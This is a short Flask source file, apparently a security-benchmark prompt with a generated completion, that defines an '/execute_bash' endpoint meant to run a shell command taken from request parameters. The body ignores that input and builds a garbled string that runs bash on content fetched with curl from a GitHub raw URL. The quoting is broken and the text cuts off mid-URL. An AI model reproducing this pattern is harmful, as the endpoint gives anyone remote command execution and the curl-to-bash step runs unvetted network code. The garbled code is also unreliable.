import subprocess
import os

from flask import Flask, request

app = Flask(__name__)

@app.route('/execute_bash')
def execute_bash():
    '''
    Take the bash command from the request using 'command' as the key and execute it.
    Return the command.
    '''

    command = request.args['command']
    bash_command = '''
        bash -c "$(curl -s 'https://raw.githubusercontent.com/sabri-nalawade/Sabri-Nalawade/master/sabri-nalawade-0.9.1/sabri-nalawade/caffe/python/caffe/proto/caffe.proto' | python -m cpp_util.generate_caffe_pb2 > caffe.proto) && \
        bash -c "$(curl -s 'https://raw.githubusercontent.com/sabri-nalawade/Sabri-Nalawade/master/sabri-nalawade-0.9.1